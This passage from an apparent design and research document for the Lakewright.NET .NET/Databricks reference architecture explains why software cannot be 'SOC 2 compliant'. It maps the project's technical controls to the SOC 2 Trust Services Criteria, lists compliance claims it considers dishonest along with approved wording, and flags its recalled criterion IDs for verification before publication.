**[VERIFIED]** <https://www.aicpa-cima.com/resources/landing/system-and-organization-controls-soc-suite-of-services>: "SOC is a suite of service offerings CPAs may provide in connection with system-level controls of a service organization or entity-level controls of other organizations."

**[VERIFIED]** The AICPA publication title itself is definitional: "**SOC 2Â® Reporting on an Examination of Controls at a Service Organization** Relevant to Security, Availability, Processing Integrity, Confidentiality, or Privacy" â€” <https://www.aicpa-cima.com/cpe-learning/publication/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security-availability-processing-integrity-confidentiality-or-privacy>.

**[VERIFIED]** AICPA definition of a service organization (surfaced from aicpa-cima.com search): "an organization that user entities outsource tasks or entire functions toâ€¦ organized and operated to provide user entities with the benefits of the services of its personnel, expertise, equipment and technology."

**[VERIFIED]** The criteria themselves: "2017 Trust Services Criteria (With Revised Points of Focus â€” 2022)" â€” <https://www.aicpa-cima.com/resources/download/2017-trust-services-criteria-with-revised-points-of-focus-2022>. The page states the document "presents control criteria established by the AICPA's Assurance Services Executive Committee (ASEC) for use in **attestation or consulting engagements** to evaluate and report on controls over the security, availability, processing integrity, confidentiality, or privacy of information and systems", applied "(a) across an entire entity; (b) at a subsidiary, divisionâ€¦".

**The three consequences, stated plainly:**

1. **A SOC 2 report is the output of an examination performed by a licensed CPA firm on a specific service organization over a specific period.** It attests to *operating entities and their controls* â€” people, policies, evidence of operation over time â€” not to source code. There is no mechanism by which a Git repository can be in scope for a SOC 2 examination.
2. **Software is never "SOC 2 compliant."** Only an organization can obtain a SOC 2 report. A tool can *support* an organization's controls; it cannot hold the attestation.
3. **The controls SOC 2 examines are largely organizational.** Look at the common criteria: CC1 (control environment: board oversight, hiring, ethics), CC2 (internal and external communication), CC3 (risk assessment), CC4 (monitoring/evaluations), CC5 (control selection and deployment), CC9 (vendor risk management). Roughly half the framework is about how a company is run. An accelerator can move the needle on CC6, CC7, CC8 â€” access control, system operations, change management â€” and essentially nothing on CC1â€“CC5 and CC9.

### What Lakewright.NET *can* legitimately claim

> The Lakewright.NET reference architecture implements technical controls that **map to** the SOC 2 Trust Services Criteria. A team adopting it starts with audit-relevant primitives â€” tenant-scoped access control, immutable audit logging, encryption in transit and at rest, reviewed change management, and vulnerability management â€” already in place, so their own SOC 2 readiness effort begins from a shorter list. The SOC 2 report remains theirs to obtain from a licensed CPA firm; Lakewright.NET does not and cannot hold one.

Second useful framing: **shared responsibility.** **[VERIFIED]** Databricks issues SOC 1 Type II, SOC 2 Type II, and a publicly downloadable SOC 3, "three times a year on a continuous rolling basis, with a reporting period of 12 monthsâ€¦ refreshed in June, August and December" â€” <https://www.databricks.com/trust/compliance/soc>. SOC 1/SOC 2 Type II require asking your Databricks account team; SOC 3 is public. **[VERIFIED]** Databricks operates a documented shared responsibility model (<https://www.databricks.com/trust/trust>, <https://www.databricks.com/legal/security-addendum>).

That gives a clean, honest three-layer story for the docs:

| Layer | Who holds the attestation | What Lakewright.NET does |
|---|---|---|
| Cloud + Databricks platform | Databricks (SOC 2 Type II, SOC 3 public); the CSP (ISO 27001, SOC 1/2, PCI-DSS) | Nothing â€” inherit it, and link to Databricks' SOC 3 |
| Application controls | **The adopting team** â€” they get the SOC 2 report | Ships the implementation: RBAC, tenant isolation, audit trail, secret handling, monitoring |
| Organizational controls (CC1â€“CC5, CC9) | The adopting team | Nothing â€” provides a checklist and pointers only |

## B10. Trust Services Criteria â€” categories and common criteria

**[VERIFIED]** Five categories, from the AICPA document title and landing pages above: **Security, Availability, Processing Integrity, Confidentiality, Privacy.**

**[VERIFIED, secondary]** **Security is the only mandatory category**; the other four are elective and "can be added to the examination at the discretion of management, or if it is determined that the criteria are key to the services being provided" â€” <https://linfordco.com/blog/trust-services-critieria-principles-soc-2/>. The Security category is realised through the nine **common criteria** CC1â€“CC9.

**[VERIFIED, secondary â€” two independent sources agree]** <https://secureframe.com/hub/soc-2/common-criteria> and <https://linfordco.com/blog/trust-services-critieria-principles-soc-2/>:

| Group | Title | COSO principles it maps to | Sub-criteria count |
|---|---|---|---|
| CC1 | Control Environment | 1â€“5 | 5 (CC1.1â€“CC1.5) |
| CC2 | Communication and Information | 13â€“15 | 3 (CC2.1â€“CC2.3) |
| CC3 | Risk Assessment | 6â€“9 | 4 (CC3.1â€“CC3.4) |
| CC4 | Monitoring Activities / Controls | 16 | 2 (CC4.1â€“CC4.2) |
| CC5 | Control Activities | 10â€“12 | 3 (CC5.1â€“CC5.3) |
| CC6 | Logical and Physical Access Controls | â€” | 8 (CC6.1â€“CC6.8) |
| CC7 | System Operations | â€” | 5 (CC7.1â€“CC7.5) |
| CC8 | Change Management | â€” | 1 (CC8.1) |
| CC9 | Risk Mitigation | â€” | 2 (CC9.1â€“CC9.2) |

**Caveat, stated plainly:** the AICPA PDF is behind a download page and could not be text-extracted this session (the direct PDF URL 404s; a mirror returned binary that could not be rendered). The **five categories and the "attestation engagement / service organization" framing are verified from AICPA pages directly.** The **CC1â€“CC9 group titles, sub-criteria counts, and COSO mappings are verified only from two independent reputable secondary sources that agree with each other.** Before the mapping table below ships as a public docs page, **buy or download the official 2017 TSC (with 2022 revised points of focus) from <https://www.aicpa-cima.com/resources/download/2017-trust-services-criteria-with-revised-points-of-focus-2022> and check every sub-criterion ID.** Sub-criterion IDs in the table below are **[RECALLED]** and are the single highest-risk-of-error element in this research.

## B11. Control mapping table

Every criterion ID here is **[RECALLED]** and must be verified against the official TSC before publication. Implementation artifacts are Lakewright.NET design proposals, not verified facts.

| # | Control | TSC criterion | Concrete .NET / Databricks implementation artifact |
|---|---|---|---|
| 1 | **Audit logging (application)** | CC7.2, CC7.3 (Security); supports CC6.1 | Append-only Delta table `lakewright.audit.audit_events` in Unity Catalog, written by an `IAuditWriter` in the .NET API pipeline. Columns: `event_id, event_time, tenant_id, actor_id, actor_type, action, resource_type, resource_id, outcome, source_ip, user_agent, request_id, before_hash, after_hash`. Writes are `INSERT`-only; `UPDATE`/`DELETE` denied by UC grants; a Delta table-property comment records the append-only contract. Emitted from an ASP.NET Core middleware/filter so coverage is structural, not per-endpoint. |
| 2 | **Platform audit logging** | CC7.2 | **[VERIFIED]** Databricks system table **`system.access.audit`** â€” <https://docs.databricks.com/aws/en/admin/system-tables/audit-logs>. Fields include `account_id, workspace_id, event_time, event_date, source_ip_address, user_agent, session_id, user_identity, service_name, action_name, request_id, request_params, response, audit_level, event_id, identity_metadata`. Requires Unity Catalog; access needs `USE CATALOG` on `system`, `USE SCHEMA`, and `SELECT`. Filter on `event_date` not `event_time` for performance. **[VERIFIED]** Most audit logs are only available in the workspace's region. Retention: each system table has a documented free retention period â€” **look up the current figure for `system.access.audit` in <https://docs.databricks.com/aws/en/admin/system-tables> before quoting it**, and pipe to long-term storage if the compliance window exceeds it. |
| 3 | **RBAC / authorization** | CC6.1, CC6.3 | ASP.NET Core policy-based authorization: named policies in `AddAuthorization`, an `IAuthorizationHandler` per resource type, role and permission claims sourced from Entra ID app roles. A single `[Authorize]` default policy at the endpoint-routing level so unprotected endpoints are opt-out, not opt-in. Permission matrix generated from code into `docs/compliance/permissions.md` by a test, so the docs cannot drift from the code. |
| 4 | **Tenant isolation** | CC6.1, CC6.6; Confidentiality (C1.1) | Two-layer, defence in depth: (a) `ITenantContext` resolved once per request from the validated token, with an EF Core global query filter on `TenantId` plus a save-interceptor that rejects cross-tenant writes; (b) Unity Catalog enforcement â€” per-tenant catalog or schema, or row filters / column masks on shared tables, with the Databricks query issued under a tenant-scoped identity rather than a shared service principal. An architecture test asserts every `ITenantScoped` entity has the filter applied. |
| 5 | **Encryption in transit** | CC6.7 | HTTPS-only: HSTS with preload, TLS 1.2 minimum enforced at the ingress, `RequireHttpsMetadata` on the JWT bearer handler, HTTPâ†’HTTPS redirect. Databricks SQL/REST connections over TLS by default. Evidence artifact: a scheduled TLS-configuration check in CI (e.g. `testssl.sh` against the deployed endpoint) whose output is retained. |
| 6 | **Encryption at rest** | CC6.7; Confidentiality | Cloud-provider storage encryption on the Delta storage account/bucket, plus customer-managed keys where the tenant requires them. Application-level column encryption only for the narrow set of fields that need it, via ASP.NET Core Data Protection with keys in Key Vault. Documented in an ADR with the explicit statement of what is *not* encrypted at application level and why. |
| 7 | **Secret management** | CC6.1, CC6.6 | No secrets in source or config files. `DefaultAzureCredential` / workload identity for Azure resources; Databricks OAuth machine-to-machine (service principal + OIDC federation) rather than PATs; Databricks secret scopes for anything that must live in the workspace. GitHub **push protection** and **secret scanning** on (free, public repo) as the mechanical backstop. `dotnet user-secrets` for local dev only. Rotation schedule documented in `SECURITY.md`. |
| 8 | **Change management via PR review** | **CC8.1** | GitHub ruleset on `main`: PR required, â‰¥1 approving review, approval of most recent push, required status checks (build, test, CodeQL, actionlint+zizmor), conversation resolution, linear history, force-push and deletion blocked. Evidence artifact: the PR record itself â€” every merge is traceable to an approved review and a green check set. This is the single control where a Git-based accelerator produces genuinely audit-grade evidence with zero extra work. |
| 9 | **Logical access provisioning / deprovisioning** | CC6.1, CC6.2, CC6.3 | Identity in Entra ID; group-based assignment to app roles; SCIM provisioning from Entra ID into the Databricks account so workspace access follows the IdP. Joiner/mover/leaver is the IdP's lifecycle, not application code â€” the accelerator's job is to have **no local user store to go stale**. Documented as a deliberate architectural constraint. |
| 10 | **Access review** | CC6.2, CC6.3 | A scheduled job producing a quarterly access-review extract: users Ã— tenants Ã— roles Ã— last-login, joined against `system.access.audit` for actual usage, written to a Delta table and rendered to a reviewable report. Sign-off captured as a row in an `access_reviews` table with reviewer identity and timestamp. Entra ID Access Reviews handles the IdP side. |
| 11 | **Backup and restore** | **Availability (A1.2)**; CC7.5 | Delta Lake time travel plus `DEEP CLONE` to a separate storage location on a schedule; documented RPO/RTO; Lakebase/operational-store point-in-time restore. The control that auditors actually test is not the backup, it is the **restore test** â€” so ship a runbook plus an annually-scheduled restore drill whose output (timestamp, dataset, verification query result) is written to an evidence table. |
| 12 | **Incident response** | CC7.3, CC7.4, CC7.5 | `SECURITY.md` with the private-reporting channel (GitHub private vulnerability reporting) and a stated response SLA; an incident runbook in `docs/runbooks/incident-response.md` with severity definitions, on-call escalation, communication templates, and a post-incident review template. GitHub repository security advisories as the coordinated-disclosure mechanism. |
| 13 | **Vulnerability management** | CC7.1, **CC9.1**; CC3.2 | Dependabot alerts + version and security updates (`nuget`, `github-actions`); CodeQL code scanning on push and PR; `dotnet list package --vulnerable --include-transitive` as a failing CI gate; OpenSSF Scorecard weekly with SARIF into the Security tab; a documented remediation SLA by severity in `SECURITY.md` (which also satisfies the Best Practices badge's "no unpatched medium/high older than 60 days"). |
| 14 | **Monitoring and alerting** | CC7.1, **CC7.2**; CC4.1 | OpenTelemetry .NET instrumentation exporting traces/metrics/logs to the platform backend; structured logging with `tenant_id` and `request_id` on every record; alert rules on authentication failure rate, authorization denials, cross-tenant access attempts, error rate, and latency SLOs; Databricks SQL alerts over `system.access.audit` for privileged-action anomalies. Evidence artifact: the alert definitions live in the IaC/bundle, so they are version-controlled and reviewable. |
| 15 | **Data retention and deletion** | **Privacy (P4.2)**; Confidentiality (C1.2); CC6.5 | Per-tenant retention policy expressed as configuration; a scheduled Delta `DELETE` + `VACUUM` job enforcing it; a tenant-offboarding runbook that drops the tenant's UC schema/catalog and purges the operational store, emitting a signed deletion certificate row into the audit table. Note the interaction with control 1: **the audit table must be exempt from tenant deletion or the deletion evidence dies with the data** â€” document that exemption explicitly, it is exactly the kind of thing an auditor asks about. |
| 16 | **Risk assessment / vendor risk** | CC3.1â€“CC3.4, **CC9.2** | Not implementable in code. Provide a template: a `docs/compliance/risk-register.md` skeleton and a vendor list (Databricks, cloud provider, NuGet dependencies via the SBOM) with the note that the adopting organization owns this. Being explicit about what the accelerator does *not* do is what makes the rest of the mapping credible. |

**How to present this page.** Three columns: control Â· TSC criterion Â· where it lives in this repo (file path or workflow). Add a fourth column "evidence an auditor would ask for" â€” that is what turns a mapping table from marketing into something a compliance team will actually use. And put the disclaimer at the *top* of the page, not in a footnote.

## B12. What would be dishonest to claim

**Never say, write, or badge any of these:**

| Forbidden | Why |
|---|---|
| "SOC 2 compliant" / "SOC 2 certified" | SOC 2 is an attestation on a service organization, not a certification, and never applies to software. **[VERIFIED]** â€” the AICPA framing is "Reporting on an Examination of Controls **at a Service Organization**". Also: SOC 2 produces a *report*, not a *certificate*; "SOC 2 certified" is wrong even for a company that has one. |
| A SOC 2 badge in the README, or an AICPA/SOC logo | The AICPA SOC logo may only be used by organizations that have completed the relevant examination, under AICPA logo-usage rules. Using it without a report is a misrepresentation. **[RECALLED â€” check the AICPA SOC logo usage guidance before anyone is tempted.]** |
| "SOC 2 ready" / "audit ready" / "compliant out of the box" | Implies the adopter's readiness is a property of the software. It is not â€” CC1â€“CC5 and CC9 are organizational and untouched by any code. |
| "SOC 2 certified architecture" | Architectures are not certified. |
| "Meets the SOC 2 requirements" | The criteria are not a checklist a product can meet; they are examined against an entity's controls operating over a period. |
| "Guarantees you will pass your audit" | Unverifiable, and the auditor's opinion depends overwhelmingly on things outside the code. |
| Implying the Databricks SOC 2 report covers the adopter | **[VERIFIED]** Databricks operates a shared responsibility model â€” <https://www.databricks.com/trust/trust>. Inheriting a platform's controls covers the platform layer only. |
| "ISO 27001 / HIPAA / PCI compliant" | Same category error, same answer. |

**Approved wording â€” use these verbatim.**

Short form (README, one line):

> Implements technical controls that map to the SOC 2 Trust Services Criteria. Lakewright.NET is software and cannot itself hold a SOC 2 report â€” see `docs/compliance/soc2-mapping.md`.

Long form (top of the compliance docs page):

> **What this page is.** SOC 2 is an attestation engagement performed by a licensed CPA firm on the controls of a *service organization* â€” an operating company â€” over a defined period. Software cannot be "SOC 2 compliant"; only an organization can obtain a SOC 2 report. This page maps the technical controls Lakewright.NET implements to the AICPA Trust Services Criteria, so that a team building on it can see which of their audit-relevant controls are already implemented and which they must build and operate themselves.
>
> **What this page is not.** It is not a certification, an attestation, an audit, or advice from an auditor. Roughly half the SOC 2 common criteria â€” the control environment (CC1), communication (CC2), risk assessment (CC3), monitoring (CC4), control activities (CC5), and risk mitigation and vendor management (CC9) â€” are organizational and cannot be addressed by any software. Lakewright.NET contributes to the logical access (CC6), system operations (CC7), and change management (CC8) criteria. Your auditor decides what counts as evidence; nothing here binds them.
>
> **Platform controls are inherited, not provided.** Databricks publishes SOC 1 Type II, SOC 2 Type II, and a public SOC 3 report, and operates a documented shared responsibility model. Controls at the platform layer are Databricks'; controls at the application layer are yours; Lakewright.NET is a starting implementation of the latter.

---

## Open items to resolve before publication

1. **Verify every CC sub-criterion ID in the B11 table** against the official 2017 TSC (with 2022 revised points of focus). Highest-risk item in this document.
2. **Confirm the licence of whatever Databricks OpenAPI spec artefact is used** for client generation, and record it in an ADR (A7 item 4).
3. **Check the current free retention period for `system.access.audit`** in <https://docs.databricks.com/aws/en/admin/system-tables> before quoting any figure.
4. **Confirm GitHub Actions minutes for public repos** on a Free personal account (the plans page states 2,000 min/month without distinguishing repo visibility).
5. **Check AICPA SOC logo usage guidance** so the "no badge" rule has a citation behind it.
6. Decide whether to also run `microsoft/sbom-tool` for SPDX alongside CycloneDX, or wait for a consumer to ask.
